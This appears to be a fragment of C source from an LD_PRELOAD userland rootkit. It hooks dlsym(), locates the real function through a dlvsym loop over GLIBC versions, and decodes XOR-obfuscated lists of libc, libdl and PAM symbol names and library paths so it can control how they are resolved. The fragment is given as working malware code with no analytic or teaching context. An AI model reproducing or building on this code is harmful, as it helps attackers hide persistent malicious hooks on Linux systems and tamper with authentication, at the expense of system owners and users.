extern void *_dl_sym(void *, const char *, void *);

void locate_dlsym()
{
    char buf[32]; int maxver = 40;

    for(int a = 0; a < maxver; a++)
    {
        sprintf(buf, "GLIBC_2.%d", a);
        o_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
        if(o_dlsym) return;
    }

    for(int a = 0; a < maxver; a++)
    {
        for(int b = 0; b < maxver; b++)
        {
            sprintf(buf, "GLIBC_2.%d.%d", a, b);
            o_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
            if(o_dlsym) return; // we got dlsym() via dlvsym(), return to let the function know we're done
        }
    }
}

void *dlsym(void *handle, const char *symbol)
{
    if(!o_dlsym) locate_dlsym();

    void *funcptr; int i;

    // set up spoofing once i have a decent way of storing strings
    for(i = 0; i < LIBC_SIZE; i++)
    {
        char *curr_call = strdup(libc_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libc_path = strdup(LIBC_PATH); xor(libc_path);
            void *libc = dlopen(libc_path, RTLD_LAZY);
            CLEAN(libc_path);

            funcptr = o_dlsym(libc, symbol);
            return funcptr;
        }
    }

    for(i = 0; i < LIBDL_SIZE; i++)
    {
        char *curr_call = strdup(libdl_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libdl_path = strdup(LIBDL_PATH); xor(libdl_path);
            void *libdl = dlopen(libdl_path, RTLD_LAZY);
            CLEAN(libdl_path);

            funcptr = o_dlsym(libdl, symbol);
            return funcptr;
        }
    }

    for(i = 0; i < LIBPAM_SIZE; i++)
    {
        char *curr_call = strdup(libpam_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libpam_path = strdup(LIBPAM_PATH); xor(libpam_path);
            void *libpam = dlopen(libpam_path, RTLD_LAZY);
            CLEAN(libpam_path);

            funcptr = o_dlsym(libpam, symbol);
            return funcptr;
        }
    }

    funcptr = o_dlsym(handle, symbol);
    return funcptr;
}
